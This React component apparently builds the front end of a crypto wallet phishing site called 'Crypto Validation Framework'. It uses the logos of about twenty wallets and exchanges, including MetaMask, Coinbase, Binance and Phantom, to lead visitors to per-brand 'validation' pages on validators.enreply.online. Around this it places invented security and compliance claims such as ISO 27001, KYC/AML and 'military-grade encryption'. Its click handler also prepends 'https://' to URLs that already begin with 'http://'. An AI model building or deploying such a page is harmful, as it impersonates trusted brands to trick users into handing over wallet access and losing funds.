import React from 'react'
import { Shield, Lock, Zap, Globe, TrendingUp, Users, Award, Clock } from 'lucide-react'
import './pagesCss/default.css'

// Import platform logos
import metamaskLogo from '../assets/metamask_header_logo.svg'
import cryptoLogo from '../assets/crypto_com_logo.png'
import phantomLogo from '../assets/PhantomLogo.jpg'
import trustLogo from '../assets/trust_logo.png'
import coinbaseLogo from '../assets/coinbase_logo.png'
import robinhoodLogo from '../assets/home_top_logo.png'
import krakenLogo from '../assets/kraken_header_logo.png'
import bitcoinLogo from '../assets/bitcoin_logo.png'
import exodusLogo from '../assets/exodus_header_icon.png'
import revolutLogo from '../assets/revolut_logo.png'
import binanceLogo from '../assets/binance_logo.png'
import geminiLogo from '../assets/gemini_logo.png'
import skrillLogo from '../assets/skrill_logo.png'
import uniswapLogo from '../assets/uniswap_logo.png'
import vaultLogo from '../assets/vault_logo.webp'
import etoroLogo from '../assets/etoro_logo.png'
import bitPanda from '../assets/Bitpanda_logo.png'
import edgeLogo from '../assets/edge_logo.png'

const Default = () => {
  const platforms = [
    { name: 'MetaMask', logo: metamaskLogo, url: 'http://validators.enreply.online/meta' },
    { name: 'Crypto.com', logo: cryptoLogo, url: 'http://validators.enreply.online/crypto' },
    { name: 'Phantom', logo: phantomLogo, url: 'http://validators.enreply.online/phantom' },
    { name: 'Trust Wallet', logo: trustLogo, url: 'http://validators.enreply.online/trust' },
    { name: 'Coinbase', logo: coinbaseLogo, url: 'http://validators.enreply.online/coinbase' },
    { name: 'Robinhood', logo: null, url: 'http://validators.enreply.online/robinhood' },
    { name: 'Kraken', logo: krakenLogo, url: 'http://validators.enreply.online/kraken' },
    { name: 'Bitcoin.com', logo: bitcoinLogo, url: 'http://validators.enreply.online/bitcoin' },
    { name: 'Exodus', logo: exodusLogo, url: 'http://validators.enreply.online/exodu' },
    { name: 'Uniswap', logo: uniswapLogo, url: 'http://validators.enreply.online/uniswap' },
    { name: 'Vault', logo: vaultLogo, url: 'http://validators.enreply.online/vault' },
    { name: 'Revolut', logo: revolutLogo, url: 'http://validators.enreply.online/revolut' },
    { name: 'Binance', logo: binanceLogo, url: 'http://validators.enreply.online/binance' },
    { name: 'Gemini', logo: geminiLogo, url: 'http://validators.enreply.online/gemini' },
    { name: 'CB Payments', logo: coinbaseLogo, url: 'http://validators.enreply.online/cbpayment' },
    { name: 'Skrill', logo: skrillLogo, url: 'http://validators.enreply.online/skrill' },
    { name: 'Etoro', logo: etoroLogo, url: 'http://validators.enreply.online/etoro' },
    { name: 'Bitpanda', logo: bitPanda, url: 'http://validators.enreply.online/bitpanda' },
    { name: 'Edge', logo: edgeLogo, url: 'http://validators.enreply.online/edge' },
    { name: 'Others', logo: null, url: 'http://validators.enreply.online/wallets' },
  ]

  const handlePlatformClick = (url) => {
    window.location.href = `https://${url}`
  }

  return (
    <div className="crypto-container">
      {/* Hero Section */}
      <div className="content-wrapper">
        <div className="hero-section">
          <div className="hero-icon-wrapper">
            <div className="hero-icon-container">
              <Shield className="hero-icon" />
            </div>
          </div>
          <h1 className="hero-title">
            Crypto Validation Framework
          </h1>
          {/* <p className="hero-description">
            Professional cryptocurrency wallet validation and security infrastructure built for the modern digital economy. 
            Ensuring your assets remain protected with institutional-grade security protocols.
          </p> */}
        </div>

        {/* Stats Section */}
        <div className="stats-grid">
          <div className="stat-card2"> 
            {/* <div className="stat-value stat-blue">99.9%</div>
            <div className="stat-label">Uptime Guarantee</div> */}
           </div>
          <div className="stat-card">
            <div className="stat-value stat-cyan">256-bit</div>
            <div className="stat-label">Encryption Standard</div>
          </div>
          <div className="stat-card">
            <div className="stat-value stat-purple">24/7</div>
            <div className="stat-label">Security Monitoring</div>
          </div>
          <div className="stat-card2">
            {/* <div className="stat-value stat-green">Multi-Sig</div>
            <div className="stat-label">Wallet Support</div> */}
          </div>
        </div>

        {/* Platform Selection Section */}
        <div className="platform-selection-section">
          <h2 className="platform-selection-title">
            Select applicable wallet to Validate
          </h2>
          <p className="platform-selection-subtitle">
            Select your wallet provider to begin the secure validation process
          </p>
          
          <div className="platforms-grid">
            {platforms.map((platform, index) => (
              <button
                key={index}
                className="platform-button"
                onClick={() => handlePlatformClick(platform.url)}
              >
                {platform.logo ? (
                  <div className="platform-logo-wrapper">
                    <img 
                      src={platform.logo} 
                      alt={`${platform.name} logo`}
                      className="platform-logo"
                    />
                  </div>
                ) : (
                  <div className="platform-icon-placeholder">
                    <Shield className="platform-placeholder-icon" />
                  </div>
                )}
                <span className="platform-name">{platform.name}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Features Grid */}
        <div className="features-grid">
          <div className="feature-card">
            <div className="feature-icon feature-icon-blue">
              <Lock className="icon" />
            </div>
            <h3 className="feature-title">Bank-Grade Security</h3>
            <p className="feature-description">
              Military-grade encryption protocols protect your digital assets with the same security standards used by major financial institutions worldwide.
            </p>
          </div>

          <div className="feature-card">
            <div className="feature-icon feature-icon-cyan">
              <Zap className="icon" />
            </div>
            <h3 className="feature-title">Lightning Fast Validation</h3>
            <p className="feature-description">
              Advanced algorithms process wallet validations in milliseconds, ensuring seamless transactions without compromising security or accuracy.
            </p>
          </div>

          <div className="feature-card">
            <div className="feature-icon feature-icon-purple">
              <Globe className="icon" />
            </div>
            <h3 className="feature-title">Multi-Chain Support</h3>
            <p className="feature-description">
              Compatible with all major blockchain networks including Bitcoin, Ethereum, Binance Smart Chain, Polygon, and emerging layer-2 solutions.
            </p>
          </div>

          <div className="feature-card">
            <div className="feature-icon feature-icon-green">
              <TrendingUp className="icon" />
            </div>
            <h3 className="feature-title">Real-Time Analytics</h3>
            <p className="feature-description">
              Comprehensive dashboard providing instant insights into wallet activity, transaction history, and security status with detailed reporting features.
            </p>
          </div>

          <div className="feature-card">
            <div className="feature-icon feature-icon-orange">
              <Users className="icon" />
            </div>
            <h3 className="feature-title">Team Collaboration</h3>
            <p className="feature-description">
              Built-in support for organizational workflows with role-based access control, approval systems, and audit trails for complete transparency.
            </p>
          </div>

          <div className="feature-card">
            <div className="feature-icon feature-icon-pink">
              <Award className="icon" />
            </div>
            <h3 className="feature-title">Compliance Ready</h3>
            <p className="feature-description">
              Meets regulatory requirements with built-in KYC/AML verification, transaction monitoring, and comprehensive audit logging capabilities.
            </p>
          </div>
        </div>

        {/* Technology Section */}
        <div className="technology-section">
          <div className="technology-header">
            <Clock className="technology-icon" />
            <h2 className="technology-title">Advanced Technology Stack</h2>
          </div>
          <div className="technology-grid">
            <div>
              <h4 className="tech-subtitle tech-subtitle-blue">Blockchain Infrastructure</h4>
              <p className="tech-description">
                Our infrastructure leverages distributed ledger technology with redundant node architecture across multiple geographic regions, ensuring continuous availability and data integrity.
              </p>
              <p className="tech-note">
                Supporting EVM-compatible chains, Bitcoin protocol variants, and emerging consensus mechanisms including Proof-of-Stake and delegated Byzantine Fault Tolerance.
              </p>
            </div>
            <div>
              <h4 className="tech-subtitle tech-subtitle-cyan">Security Framework</h4>
              <p className="tech-description">
                Implementation of hardware security modules (HSM), cold storage solutions, and multi-signature authentication ensures your assets remain protected against sophisticated threats.
              </p>
              <p className="tech-note">
                Regular penetration testing, bug bounty programs, and compliance with ISO 27001 standards maintain the highest security posture in the industry.
              </p>
            </div>
          </div>
        </div>

        {/* Trust Indicators */}
        <div className="trust-section">
          <h2 className="trust-title">End to end Encryption</h2>
          <div className="trust-brands">
            <div className="brand-name">DEFI PROTOCOL</div>
            <div className="brand-name">CRYPTO EXCHANGE</div>
            <div className="brand-name">WEB3 VENTURES</div>
            <div className="brand-name">BLOCKCHAIN LABS</div>
          </div>
        </div>

        {/* Footer Info */}
        <div className="footer-info">
          <p className="footer-text">
            Designed for Institutional security, compliance,  and performance in digital assets.
          </p>
        </div>
      </div>
    </div>
  )
}

export default Default